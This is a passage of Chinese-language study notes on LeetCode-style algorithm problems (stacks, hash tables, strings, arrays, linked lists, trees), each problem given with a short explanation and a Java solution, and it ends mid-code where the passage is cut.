用栈实现括号匹配 20. Valid Parentheses (Easy) 123"()[]&#123;&#125;"Output : true 1234567891011121314151617181920public boolean isValid(String s) &#123; Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); for (char c : s.toCharArray()) &#123; if (c == '(' || c == '&#123;' || c == '[') &#123; stack.push(c); &#125; else &#123; if (stack.isEmpty()) &#123; return false; &#125; char cStack = stack.pop(); boolean b1 = c == ')' &amp;&amp; cStack != '('; boolean b2 = c == ']' &amp;&amp; cStack != '['; boolean b3 = c == '&#125;' &amp;&amp; cStack != '&#123;'; if (b1 || b2 || b3) &#123; return false; &#125; &#125; &#125; return stack.isEmpty();&#125; 数组中元素与下一个比它大的元素之间的距离 739. Daily Temperatures (Medium) 12Input: [73, 74, 75, 71, 69, 72, 76, 73]Output: [1, 1, 4, 2, 1, 1, 0, 0] 在遍历数组时用 Stack 把数组中的数存起来，如果当前遍历的数比栈顶元素来的大，说明栈顶元素的下一个比它大的数就是当前元素。 12345678910111213public int[] dailyTemperatures(int[] temperatures) &#123; int n = temperatures.length; int[] dist = new int[n]; Stack&lt;Integer&gt; indexs = new Stack&lt;&gt;(); for (int curIndex = 0; curIndex &lt; n; curIndex++) &#123; while (!indexs.isEmpty() &amp;&amp; temperatures[curIndex] &gt; temperatures[indexs.peek()]) &#123; int preIndex = indexs.pop(); dist[preIndex] = curIndex - preIndex; &#125; indexs.add(curIndex); &#125; return dist;&#125; 循环数组中比当前元素大的下一个元素 503. Next Greater Element II (Medium) 12345Input: [1,2,1]Output: [2,-1,2]Explanation: The first 1&apos;s next greater number is 2; The number 2 can&apos;t find next greater number; The second 1&apos;s next greater number needs to search circularly, which is also 2. 与 739. Daily Temperatures (Medium) 不同的是，数组是循环数组，并且最后要求的不是距离而是下一个元素。 12345678910111213141516public int[] nextGreaterElements(int[] nums) &#123; int n = nums.length; int[] next = new int[n]; Arrays.fill(next, -1); Stack&lt;Integer&gt; pre = new Stack&lt;&gt;(); for (int i = 0; i &lt; n * 2; i++) &#123; int num = nums[i % n]; while (!pre.isEmpty() &amp;&amp; nums[pre.peek()] &lt; num) &#123; next[pre.pop()] = num; &#125; if (i &lt; n)&#123; pre.push(i); &#125; &#125; return next;&#125; 哈希表哈希表使用 O(N) 空间复杂度存储数据，从而能够以 O(1) 时间复杂度求解问题。 Java 中的 HashSet 用于存储一个集合，可以查找元素是否在集合中。 如果元素有穷，并且范围不大，那么可以用一个布尔数组来存储一个元素是否存在。例如对于只有小写字符的元素，就可以用一个长度为 26 的布尔数组来存储一个字符集合，使得空间复杂度降低为 O(1)。 Java 中的 HashMap 主要用于映射关系，从而把两个元素联系起来。 在对一个内容进行压缩或者其它转换时，利用 HashMap 可以把原始内容和转换后的内容联系起来。例如在一个简化 url 的系统中Leetcdoe : 535. Encode and Decode TinyURL (Medium)，利用 HashMap 就可以存储精简后的 url 到原始 url 的映射，使得不仅可以显示简化的 url，也可以根据简化的 url 得到原始 url 从而定位到正确的资源。 HashMap 也可以用来对元素进行计数统计，此时键为元素，值为计数。和 HashSet 类似，如果元素有穷并且范围不大，可以用整型数组来进行统计。 数组中的两个数和为给定值 1. Two Sum (Easy) 可以先对数组进行排序，然后使用双指针方法或者二分查找方法。这样做的时间复杂度为 O(NlogN)，空间复杂度为 O(1)。 用 HashMap 存储数组元素和索引的映射，在访问到 nums[i] 时，判断 HashMap 中是否存在 target - nums[i]，如果存在说明 target - nums[i] 所在的索引和 i 就是要找的两个数。该方法的时间复杂度为 O(N)，空间复杂度为 O(N)，使用空间来换取时间。 1234567891011public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; indexForNum = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if (indexForNum.containsKey(target - nums[i])) &#123; return new int[]&#123;indexForNum.get(target - nums[i]), i&#125;; &#125; else &#123; indexForNum.put(nums[i], i); &#125; &#125; return null;&#125; 判断数组是否含有重复元素 217. Contains Duplicate (Easy) 1234567public boolean containsDuplicate(int[] nums) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for (int num : nums) &#123; set.add(num); &#125; return set.size() &lt; nums.length;&#125; 最长和谐序列 594. Longest Harmonious Subsequence (Easy) 123Input: [1,3,2,2,5,2,3,7]Output: 5Explanation: The longest harmonious subsequence is [3,2,2,2,3]. 和谐序列中最大数和最小数只差正好为 1，应该注意的是序列的元素不一定是数组的连续元素。 12345678910111213public int findLHS(int[] nums) &#123; Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; countForNum.put(num, countForNum.getOrDefault(num, 0) + 1); &#125; int longest = 0; for (int num : countForNum.keySet()) &#123; if (countForNum.containsKey(num + 1)) &#123; longest = Math.max(longest, countForNum.get(num + 1) + countForNum.get(num)); &#125; &#125; return longest;&#125; 最长连续序列 128. Longest Consecutive Sequence (Hard) 12Given [100, 4, 200, 1, 3, 2],The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4. 要求以 O(N) 的时间复杂度求解。 12345678910111213141516171819202122232425262728293031public int longestConsecutive(int[] nums) &#123; Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; countForNum.put(num, 1); &#125; for (int num : nums) &#123; forward(countForNum, num); &#125; return maxCount(countForNum);&#125;private int forward(Map&lt;Integer, Integer&gt; countForNum, int num) &#123; if (!countForNum.containsKey(num)) &#123; return 0; &#125; int cnt = countForNum.get(num); if (cnt &gt; 1) &#123; return cnt; &#125; cnt = forward(countForNum, num + 1) + 1; countForNum.put(num, cnt); return cnt;&#125;private int maxCount(Map&lt;Integer, Integer&gt; countForNum) &#123; int max = 0; for (int num : countForNum.keySet()) &#123; max = Math.max(max, countForNum.get(num)); &#125; return max;&#125; 字符串两个字符串包含的字符是否完全相同 242. Valid Anagram (Easy) 12s = "anagram", t = "nagaram", return true.s = "rat", t = "car", return false. 字符串只包含小写字符，总共有 26 个小写字符。可以用 HashMap 来映射字符与出现次数。因为键的范围很小，因此可以使用长度为 26 的整型数组对字符串出现的字符进行统计，然后比较两个字符串出现的字符数量是否相同。 123456789101112131415public boolean isAnagram(String s, String t) &#123; int[] cnts = new int[26]; for (char c : s.toCharArray()) &#123; cnts[c - 'a']++; &#125; for (char c : t.toCharArray()) &#123; cnts[c - 'a']--; &#125; for (int cnt : cnts) &#123; if (cnt != 0) &#123; return false; &#125; &#125; return true;&#125; 计算一组字符集合可以组成的回文字符串的最大长度 409. Longest Palindrome (Easy) 123Input : "abccccdd"Output : 7Explanation : One longest palindrome that can be built is "dccaccd", whose length is 7. 使用长度为 256 的整型数组来统计每个字符出现的个数，每个字符有偶数个可以用来构成回文字符串。 因为回文字符串最中间的那个字符可以单独出现，所以如果有单独的字符就把它放到最中间。 1234567891011121314public int longestPalindrome(String s) &#123; int[] cnts = new int[256]; for (char c : s.toCharArray()) &#123; cnts[c]++; &#125; int palindrome = 0; for (int cnt : cnts) &#123; palindrome += (cnt / 2) * 2; &#125; if (palindrome &lt; s.length()) &#123; palindrome++; // 这个条件下 s 中一定有单个未使用的字符存在，可以把这个字符放到回文的最中间 &#125; return palindrome;&#125; 字符串同构 205. Isomorphic Strings (Easy) 123Given "egg", "add", return true.Given "foo", "bar", return false.Given "paper", "title", return true. 记录一个字符上次出现的位置，如果两个字符串中的字符上次出现的位置一样，那么就属于同构。 12345678910111213public boolean isIsomorphic(String s, String t) &#123; int[] preIndexOfS = new int[256]; int[] preIndexOfT = new int[256]; for (int i = 0; i &lt; s.length(); i++) &#123; char sc = s.charAt(i), tc = t.charAt(i); if (preIndexOfS[sc] != preIndexOfT[tc]) &#123; return false; &#125; preIndexOfS[sc] = i + 1; preIndexOfT[tc] = i + 1; &#125; return true;&#125; 回文子字符串 647. Palindromic Substrings (Medium) 123Input: "aaa"Output: 6Explanation: Six palindromic strings: "a", "a", "a", "aa", "aa", "aaa". 从字符串的某一位开始，尝试着去扩展子字符串。 1234567891011121314151617private int cnt = 0;public int countSubstrings(String s) &#123; for (int i = 0; i &lt; s.length(); i++) &#123; extendSubstrings(s, i, i); // 奇数长度 extendSubstrings(s, i, i + 1); // 偶数长度 &#125; return cnt;&#125;private void extendSubstrings(String s, int start, int end) &#123; while (start &gt;= 0 &amp;&amp; end &lt; s.length() &amp;&amp; s.charAt(start) == s.charAt(end)) &#123; start--; end++; cnt++; &#125;&#125; 判断一个整数是否是回文数 9. Palindrome Number (Easy) 要求不能使用额外空间，也就不能将整数转换为字符串进行判断。 将整数分成左右两部分，右边那部分需要转置，然后判断这两部分是否相等。 1234567891011121314public boolean isPalindrome(int x) &#123; if (x == 0) &#123; return true; &#125; if (x &lt; 0 || x % 10 == 0) &#123; return false; &#125; int right = 0; while (x &gt; right) &#123; right = right * 10 + x % 10; x /= 10; &#125; return x == right || x == right / 10;&#125; 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数 696. Count Binary Substrings (Easy) 123Input: "00110011"Output: 6Explanation: There are 6 substrings that have equal number of consecutive 1's and 0's: "0011", "01", "1100", "10", "0011", and "01". 12345678910111213141516public int countBinarySubstrings(String s) &#123; int preLen = 0, curLen = 1, count = 0; for (int i = 1; i &lt; s.length(); i++) &#123; if (s.charAt(i) == s.charAt(i - 1)) &#123; curLen++; &#125; else &#123; preLen = curLen; curLen = 1; &#125; if (preLen &gt;= curLen) &#123; count++; &#125; &#125; return count;&#125; 字符串循环移位包含 编程之美：3.1 12s1 = AABCD, s2 = CDAAReturn : true 给定两个字符串 s1 和 s2，要求判定 s2 是否能够被 s1 做循环移位得到的字符串包含。 s1 进行循环移位的结果是 s1s1 的子字符串，因此只要判断 s2 是否是 s1s1 的子字符串即可。 字符串循环移位 编程之美：2.17 12s = "abcd123" k = 3Return "123abcd" 将字符串向右循环移动 k 位。 将 abcd123 中的 abcd 和 123 单独逆序，得到 dcba321，然后对整个字符串进行逆序，得到 123abcd。 字符串中单词的翻转 程序员代码面试指南 12s = "I am a student"return "student a am I" 将每个单词逆序，然后将整个字符串逆序。 数组与矩阵把数组中的 0 移到末尾 283. Move Zeroes (Easy) 1For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0]. 1234567891011public void moveZeroes(int[] nums) &#123; int idx = 0; for (int num : nums) &#123; if (num != 0) &#123; nums[idx++] = num; &#125; &#125; while (idx &lt; nums.length) &#123; nums[idx++] = 0; &#125;&#125; 改变矩阵维度 566. Reshape the Matrix (Easy) 1234567891011Input:nums =[[1,2], [3,4]]r = 1, c = 4Output:[[1,2,3,4]]Explanation:The row-traversing of nums is [1,2,3,4]. The new reshaped matrix is a 1 * 4 matrix, fill it row by row by using the previous list. 123456789101112131415public int[][] matrixReshape(int[][] nums, int r, int c) &#123; int m = nums.length, n = nums[0].length; if (m * n != r * c) &#123; return nums; &#125; int[][] reshapedNums = new int[r][c]; int index = 0; for (int i = 0; i &lt; r; i++) &#123; for (int j = 0; j &lt; c; j++) &#123; reshapedNums[i][j] = nums[index / n][index % n]; index++; &#125; &#125; return reshapedNums;&#125; 找出数组中最长的连续 1 485. Max Consecutive Ones (Easy) 12345678public int findMaxConsecutiveOnes(int[] nums) &#123; int max = 0, cur = 0; for (int x : nums) &#123; cur = x == 0 ? 0 : cur + 1; max = Math.max(max, cur); &#125; return max;&#125; 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数 645. Set Mismatch (Easy) 12Input: nums = [1,2,2,4]Output: [2,3] 12Input: nums = [1,2,2,4]Output: [2,3] 最直接的方法是先对数组进行排序，这种方法时间复杂度为 O(NlogN)。本题可以以 O(N) 的时间复杂度、O(1) 空间复杂度来求解。 主要思想是通过交换数组元素，使得数组上的元素在正确的位置上。遍历数组，如果第 i 位上的元素不是 i + 1，那么一直交换第 i 位和 nums[i] - 1 位置上的元素。 12345678910111213141516171819public int[] findErrorNums(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++) &#123; while (nums[i] != i + 1 &amp;&amp; nums[nums[i] - 1] != nums[i]) &#123; swap(nums, i, nums[i] - 1); &#125; &#125; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] != i + 1) &#123; return new int[]&#123;nums[i], i + 1&#125;; &#125; &#125; return null;&#125;private void swap(int[] nums, int i, int j) &#123; int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;&#125; 类似题目： 448. Find All Numbers Disappeared in an Array (Easy)，寻找所有丢失的元素 442. Find All Duplicates in an Array (Medium)，寻找所有重复的元素。 找出数组中重复的数，数组值在 [1, n] 之间 287. Find the Duplicate Number (Medium) 要求不能修改数组，也不能使用额外的空间。 二分查找解法： 12345678910111213public int findDuplicate(int[] nums) &#123; int l = 1, h = nums.length - 1; while (l &lt;= h) &#123; int mid = l + (h - l) / 2; int cnt = 0; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] &lt;= mid) cnt++; &#125; if (cnt &gt; mid) h = mid - 1; else l = mid + 1; &#125; return l;&#125; 双指针解法，类似于有环链表中找出环的入口： 12345678910111213public int findDuplicate(int[] nums) &#123; int slow = nums[0], fast = nums[nums[0]]; while (slow != fast) &#123; slow = nums[slow]; fast = nums[nums[fast]]; &#125; fast = 0; while (slow != fast) &#123; slow = nums[slow]; fast = nums[fast]; &#125; return slow;&#125; 有序矩阵查找 240. Search a 2D Matrix II (Medium) 12345[ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]] 1234567891011public boolean searchMatrix(int[][] matrix, int target) &#123; if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int m = matrix.length, n = matrix[0].length; int row = 0, col = n - 1; while (row &lt; m &amp;&amp; col &gt;= 0) &#123; if (target == matrix[row][col]) return true; else if (target &lt; matrix[row][col]) col--; else row++; &#125; return false;&#125; 有序矩阵的 Kth Element 378. Kth Smallest Element in a Sorted Matrix ((Medium)) 12345678matrix = [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]],k = 8,return 13. 解题参考：Share my thoughts and Clean Java Code 二分查找解法： 12345678910111213141516public int kthSmallest(int[][] matrix, int k) &#123; int m = matrix.length, n = matrix[0].length; int lo = matrix[0][0], hi = matrix[m - 1][n - 1]; while(lo &lt;= hi) &#123; int mid = lo + (hi - lo) / 2; int cnt = 0; for(int i = 0; i &lt; m; i++) &#123; for(int j = 0; j &lt; n &amp;&amp; matrix[i][j] &lt;= mid; j++) &#123; cnt++; &#125; &#125; if(cnt &lt; k) lo = mid + 1; else hi = mid - 1; &#125; return lo;&#125; 堆解法： 1234567891011121314151617181920212223public int kthSmallest(int[][] matrix, int k) &#123; int m = matrix.length, n = matrix[0].length; PriorityQueue&lt;Tuple&gt; pq = new PriorityQueue&lt;Tuple&gt;(); for(int j = 0; j &lt; n; j++) pq.offer(new Tuple(0, j, matrix[0][j])); for(int i = 0; i &lt; k - 1; i++) &#123; // 小根堆，去掉 k - 1 个堆顶元素，此时堆顶元素就是第 k 的数 Tuple t = pq.poll(); if(t.x == m - 1) continue; pq.offer(new Tuple(t.x + 1, t.y, matrix[t.x + 1][t.y])); &#125; return pq.poll().val;&#125;class Tuple implements Comparable&lt;Tuple&gt; &#123; int x, y, val; public Tuple(int x, int y, int val) &#123; this.x = x; this.y = y; this.val = val; &#125; @Override public int compareTo(Tuple that) &#123; return this.val - that.val; &#125;&#125; 数组相邻差值的个数 667. Beautiful Arrangement II (Medium) 123Input: n = 3, k = 2Output: [1, 3, 2]Explanation: The [1, 3, 2] has three different positive integers ranging from 1 to 3, and the [2, 1] has exactly 2 distinct integers: 1 and 2. 题目描述：数组元素为 1~n 的整数，要求构建数组，使得相邻元素的差值不相同的个数为 k。 让前 k+1 个元素构建出 k 个不相同的差值，序列为：1 k+1 2 k 3 k-1 … k/2 k/2+1. 1234567891011public int[] constructArray(int n, int k) &#123; int[] ret = new int[n]; ret[0] = 1; for (int i = 1, interval = k; i &lt;= k; i++, interval--) &#123; ret[i] = i % 2 == 1 ? ret[i - 1] + interval : ret[i - 1] - interval; &#125; for (int i = k + 1; i &lt; n; i++) &#123; ret[i] = i + 1; &#125; return ret;&#125; 数组的度 697. Degree of an Array (Easy) 12Input: [1,2,2,3,1,4,2]Output: 6 题目描述：数组的度定义为元素出现的最高频率，例如上面的数组度为 3。要求找到一个最小的子数组，这个子数组的度和原数组一样。 12345678910111213141516171819202122232425public int findShortestSubArray(int[] nums) &#123; Map&lt;Integer, Integer&gt; numsCnt = new HashMap&lt;&gt;(); Map&lt;Integer, Integer&gt; numsLastIndex = new HashMap&lt;&gt;(); Map&lt;Integer, Integer&gt; numsFirstIndex = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; int num = nums[i]; numsCnt.put(num, numsCnt.getOrDefault(num, 0) + 1); numsLastIndex.put(num, i); if (!numsFirstIndex.containsKey(num)) &#123; numsFirstIndex.put(num, i); &#125; &#125; int maxCnt = 0; for (int num : nums) &#123; maxCnt = Math.max(maxCnt, numsCnt.get(num)); &#125; int ret = nums.length; for (int i = 0; i &lt; nums.length; i++) &#123; int num = nums[i]; int cnt = numsCnt.get(num); if (cnt != maxCnt) continue; ret = Math.min(ret, numsLastIndex.get(num) - numsFirstIndex.get(num) + 1); &#125; return ret;&#125; 对角元素相等的矩阵 766. Toeplitz Matrix (Easy) 12345123451239512In the above grid, the diagonals are "[9]", "[5, 5]", "[1, 1, 1]", "[2, 2, 2]", "[3, 3]", "[4]", and in each diagonal all elements are the same, so the answer is True. 1234567891011121314151617181920212223public boolean isToeplitzMatrix(int[][] matrix) &#123; for (int i = 0; i &lt; matrix[0].length; i++) &#123; if (!check(matrix, matrix[0][i], 0, i)) &#123; return false; &#125; &#125; for (int i = 0; i &lt; matrix.length; i++) &#123; if (!check(matrix, matrix[i][0], i, 0)) &#123; return false; &#125; &#125; return true;&#125;private boolean check(int[][] matrix, int expectValue, int row, int col) &#123; if (row &gt;= matrix.length || col &gt;= matrix[0].length) &#123; return true; &#125; if (matrix[row][col] != expectValue) &#123; return false; &#125; return check(matrix, expectValue, row + 1, col + 1);&#125; 嵌套数组 565. Array Nesting (Medium) 1234567Input: A = [5,4,0,3,1,6,2]Output: 4Explanation:A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2.One of the longest S[K]:S[0] = &#123;A[0], A[5], A[6], A[2]&#125; = &#123;5, 6, 2, 0&#125; 题目描述：S[i] 表示一个集合，集合的第一个元素是 A[i]，第二个元素是 A[A[i]]，如此嵌套下去。求最大的 S[i]。 123456789101112131415public int arrayNesting(int[] nums) &#123; int max = 0; for (int i = 0; i &lt; nums.length; i++) &#123; int cnt = 0; for (int j = i; nums[j] != -1; ) &#123; cnt++; int t = nums[j]; nums[j] = -1; // 标记该位置已经被访问 j = t; &#125; max = Math.max(max, cnt); &#125; return max;&#125; 分隔数组 769. Max Chunks To Make Sorted (Medium) 12345Input: arr = [1,0,2,3,4]Output: 4Explanation:We can split into two chunks, such as [1, 0], [2, 3, 4].However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible. 题目描述：分隔数组，使得对每部分排序后数组就为有序。 12345678910public int maxChunksToSorted(int[] arr) &#123; if (arr == null) return 0; int ret = 0; int right = arr[0]; for (int i = 0; i &lt; arr.length; i++) &#123; right = Math.max(right, arr[i]); if (right == i) ret++; &#125; return ret;&#125; 链表链表是空节点，或者有一个值和一个指向下一个链表的指针，因此很多链表问题可以用递归来处理。 找出两个链表的交点 160. Intersection of Two Linked Lists (Easy) 12345A: a1 → a2 ↘ c1 → c2 → c3 ↗B: b1 → b2 → b3 要求：时间复杂度为 O(N)，空间复杂度为 O(1) 设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。 当访问 A 链表的指针访问到链表尾部时，令它从链表 B 的头部开始访问链表 B；同样地，当访问 B 链表的指针访问到链表尾部时，令它从链表 A 的头部开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。 12345678public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; ListNode l1 = headA, l2 = headB; while (l1 != l2) &#123; l1 = (l1 == null) ? headB : l1.next; l2 = (l2 == null) ? headA : l2.next; &#125; return l1;&#125; 如果只是判断是否存在交点，那么就是另一个问题，即 编程之美：3.6 的问题。有两种解法：把第一个链表的结尾连接到第二个链表的开头，看第二个链表是否存在环；或者直接比较两个链表的最后一个节点是否相同。 链表反转 206. Reverse Linked List (Easy) 递归 12345678910public ListNode reverseList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode next = head.next; ListNode newHead = reverseList(next); next.next = head; head.next = null; return newHead;&#125; 头插法 12345678910public ListNode reverseList(ListNode head) &#123; ListNode newHead = new ListNode(-1); while (head != null) &#123; ListNode next = head.next; head.next = newHead.next; newHead.next = head; head = next; &#125; return newHead.next;&#125; 归并两个有序的链表 21. Merge Two Sorted Lists (Easy) 1234567891011public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; if (l1 == null) return l2; if (l2 == null) return l1; if (l1.val &lt; l2.val) &#123; l1.next = mergeTwoLists(l1.next, l2); return l1; &#125; else &#123; l2.next = mergeTwoLists(l1, l2.next); return l2; &#125;&#125; 从有序链表中删除重复节点 83. Remove Duplicates from Sorted List (Easy) 12Given 1-&gt;1-&gt;2, return 1-&gt;2.Given 1-&gt;1-&gt;2-&gt;3-&gt;3, return 1-&gt;2-&gt;3. 12345public ListNode deleteDuplicates(ListNode head) &#123; if(head == null || head.next == null) return head; head.next = deleteDuplicates(head.next); return head.val == head.next.val ? head.next : head;&#125; 删除链表的倒数第 n 个节点 19. Remove Nth Node From End of List (Medium) 12Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5. 1234567891011121314public ListNode removeNthFromEnd(ListNode head, int n) &#123; ListNode fast = head; while (n-- &gt; 0) &#123; fast = fast.next; &#125; if (fast == null) return head.next; ListNode slow = head; while (fast.next != null) &#123; fast = fast.next; slow = slow.next; &#125; slow.next = slow.next.next; return head;&#125; 交换链表中的相邻结点 24. Swap Nodes in Pairs (Medium) 1Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. 题目要求：不能修改结点的 val 值，O(1) 空间复杂度。 123456789101112131415public ListNode swapPairs(ListNode head) &#123; ListNode node = new ListNode(-1); node.next = head; ListNode pre = node; while (pre.next != null &amp;&amp; pre.next.next != null) &#123; ListNode l1 = pre.next, l2 = pre.next.next; ListNode next = l2.next; l1.next = next; l2.next = l1; pre.next = l2; pre = l1; &#125; return node.next;&#125; 链表求和 445. Add Two Numbers II (Medium) 12Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)Output: 7 -&gt; 8 -&gt; 0 -&gt; 7 题目要求：不能修改原始链表。 12345678910111213141516171819202122232425public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; Stack&lt;Integer&gt; l1Stack = buildStack(l1); Stack&lt;Integer&gt; l2Stack = buildStack(l2); ListNode head = new ListNode(-1); int carry = 0; while (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != 0) &#123; int x = l1Stack.isEmpty() ? 0 : l1Stack.pop(); int y = l2Stack.isEmpty() ? 0 : l2Stack.pop(); int sum = x + y + carry; ListNode node = new ListNode(sum % 10); node.next = head.next; head.next = node; carry = sum / 10; &#125; return head.next;&#125;private Stack&lt;Integer&gt; buildStack(ListNode l) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (l != null) &#123; stack.push(l.val); l = l.next; &#125; return stack;&#125; 回文链表 234. Palindrome Linked List (Easy) 题目要求：以 O(1) 的空间复杂度来求解。 切成两半，把后半段反转，然后比较两半是否相等。 1234567891011121314151617181920212223242526272829303132333435363738public boolean isPalindrome(ListNode head) &#123; if (head == null || head.next == null) return true; ListNode slow = head, fast = head.next; while (fast != null &amp;&amp; fast.next != null) &#123; slow = slow.next; fast = fast.next.next; &#125; if (fast != null) slow = slow.next; // 偶数节点，让 slow 指向下一个节点 cut(head, slow); // 切成两个链表 return isEqual(head, reverse(slow));&#125;private void cut(ListNode head, ListNode cutNode) &#123; while (head.next != cutNode) &#123; head = head.next; &#125; head.next = null;&#125;private ListNode reverse(ListNode head) &#123; ListNode newHead = null; while (head != null) &#123; ListNode nextNode = head.next; head.next = newHead; newHead = head; head = nextNode; &#125; return newHead;&#125;private boolean isEqual(ListNode l1, ListNode l2) &#123; while (l1 != null &amp;&amp; l2 != null) &#123; if (l1.val != l2.val) return false; l1 = l1.next; l2 = l2.next; &#125; return true;&#125; 分隔链表 725. Split Linked List in Parts(Medium) 12345Input:root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]Explanation:The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts. 题目描述：把链表分隔成 k 部分，每部分的长度都应该尽可能相同，排在前面的长度应该大于等于后面的。 1234567891011121314151617181920212223public ListNode[] splitListToParts(ListNode root, int k) &#123; int N = 0; ListNode cur = root; while (cur != null) &#123; N++; cur = cur.next; &#125; int mod = N % k; int size = N / k; ListNode[] ret = new ListNode[k]; cur = root; for (int i = 0; cur != null &amp;&amp; i &lt; k; i++) &#123; ret[i] = cur; int curSize = size + (mod-- &gt; 0 ? 1 : 0); for (int j = 0; j &lt; curSize - 1; j++) &#123; cur = cur.next; &#125; ListNode next = cur.next; cur.next = null; cur = next; &#125; return ret;&#125; 链表元素按奇偶聚集 328. Odd Even Linked List (Medium) 123Example:Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL,return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL. 1234567891011121314public ListNode oddEvenList(ListNode head) &#123; if (head == null) &#123; return head; &#125; ListNode odd = head, even = head.next, evenHead = even; while (even != null &amp;&amp; even.next != null) &#123; odd.next = odd.next.next; odd = odd.next; even.next = even.next.next; even = even.next; &#125; odd.next = evenHead; return head;&#125; 树递归一棵树要么是空树，要么有两个指针，每个指针指向一棵树。树是一种递归结构，很多树的问题可以使用递归来处理。 树的高度 104. Maximum Depth of Binary Tree (Easy) 1234public int maxDepth(TreeNode root) &#123; if (root == null) return 0; return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;&#125; 平衡树 110. Balanced Binary Tree (Easy) 12345 3 / \9 20 / \ 15 7 平衡树左右子树高度差都小于等于 1 1234567891011121314private boolean result = true;public boolean isBalanced(TreeNode root) &#123; maxDepth(root); return result;&#125;public int maxDepth(TreeNode root) &#123; if (root == null) return 0; int l = maxDepth(root.left); int r = maxDepth(root.right); if (Math.abs(l - r) &gt; 1) result = false; return 1 + Math.max(l, r);&#125; 两节点的最长路径 543. Diameter of Binary Tree (Easy) 123456789Input: 1 / \ 2 3 / \ 4 5Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3]. 1234567891011121314private int max = 0;public int diameterOfBinaryTree(TreeNode root) &#123; depth(root); return max;&#125;private int depth(TreeNode root) &#123; if (root == null) return 0; int leftDepth = depth(root.left); int rightDepth = depth(root.right); max = Math.max(max, leftDepth + rightDepth); return Math.max(leftDepth, rightDepth) + 1;&#125; 翻转树 226. Invert Binary Tree (Easy) 1234567public TreeNode invertTree(TreeNode root) &#123; if (root == null) return null; TreeNode left = root.left; // 后面的操作会改变 left 指针，因此先保存下来 root.left = invertTree(root.right); root.right = invertTree(left); return root;&#125; 归并两棵树 617. Merge Two Binary Trees (Easy) 1234567891011121314Input: Tree 1 Tree 2 1 2 / \ / \ 3 2 1 3 / \ \ 5 4 7Output:Merged tree: 3 / \ 4 5 / \ \ 5 4 7 123456789public TreeNode mergeTrees(TreeNode t1, TreeNode t2) &#123; if (t1 == null &amp;&amp; t2 == null) return null; if (t1 == null) return t2; if (t2 == null) return t1; TreeNode root = new TreeNode(t1.val + t2.val); root.left = mergeTrees(t1.left, t2.left); root.right = mergeTrees(t1.right, t2.right); return root;&#125; 判断路径和是否等于一个数 Leetcdoe : 112. Path Sum (Easy) 123456789Given the below binary tree and sum = 22, 5 / \ 4 8 / / \ 11 13 4 / \ \ 7 2 1return true, as there exist a root-to-leaf path 5-&gt;4-&gt;11-&gt;2 which sum is 22. 路径和定义为从 root 到 leaf 的所有节点的和 12345public boolean hasPathSum(TreeNode root, int sum) &#123; if (root == null) return false; if (root.left == null &amp;&amp; root.right == null &amp;&amp; root.val == sum) return true; return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);&#125; 统计路径和等于一个数的路径数量 437. Path Sum III (Easy) 123456789101112131415root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \ 5 -3 / \ \ 3 2 11 / \ \3 -2 1Return 3. The paths that sum to 8 are:1. 5 -&gt; 32. 5 -&gt; 2 -&gt; 13. -3 -&gt; 11 路径不一定以 root 开头，也不一定以 leaf 结尾，但是必须连续。 12345678910111213public int pathSum(TreeNode root, int sum) &#123; if (root == null) return 0; int ret = pathSumStartWithRoot(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum); return ret;&#125;private int pathSumStartWithRoot(TreeNode root, int sum) &#123; if (root == null) return 0; int ret = 0; if (root.val == sum) ret++; ret += pathSumStartWithRoot(root.left, sum - root.val) + pathSumStartWithRoot(root.right, sum - root.val); return ret;&#125; 子树 572. Subtree of Another Tree (Easy) 123456789101112131415161718192021222324252627282930Given tree s: 3 / \ 4 5 / \ 1 2Given tree t: 4 / \ 1 2Return true, because t has the same structure and node values with a subtree of s.Given tree s: 3 / \ 4 5 / \ 1 2 / 0Given tree t: 4 / \ 1 2Return false. 1234567891011public boolean 